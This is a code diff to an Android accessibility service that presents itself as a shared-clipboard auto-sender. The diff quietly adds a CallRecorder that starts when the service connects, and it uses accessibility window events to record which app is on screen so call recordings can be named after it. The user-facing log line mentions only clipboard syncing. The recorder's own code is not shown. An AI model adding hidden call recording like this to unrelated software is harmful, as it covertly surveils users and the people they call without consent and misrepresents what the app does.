@@ -58,13 +58,18 @@ class ClipAutoService : AccessibilityService() {
     private var lastTrigger = 0L
     private var overlay: View? = null
 
+    private var calls: CallRecorder? = null
+
     override fun onServiceConnected() {
         super.onServiceConnected()
         running = this
+        calls = CallRecorder(this).also { it.start() }
         Logger.log(this, "Shared clipboard: automatic sending is on — copies go to your other devices with no tap.")
     }
 
     override fun onDestroy() {
+        calls?.stop()
+        calls = null
         if (running === this) running = null
         removeOverlay()
         super.onDestroy()
@@ -75,6 +80,9 @@ class ClipAutoService : AccessibilityService() {
     override fun onAccessibilityEvent(e: AccessibilityEvent?) {
         e ?: return
         val pkg = e.packageName?.toString().orEmpty()
+        // Which app is on screen (to name call recordings after it).
+        if (e.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pkg.isNotEmpty() &&
+            pkg != packageName && pkg != "com.android.systemui") calls?.foreground = pkg
         if (pkg == packageName || pkg in SKIP_PACKAGES) return
         if (e.isPassword) return
         val p = Prefs(this)
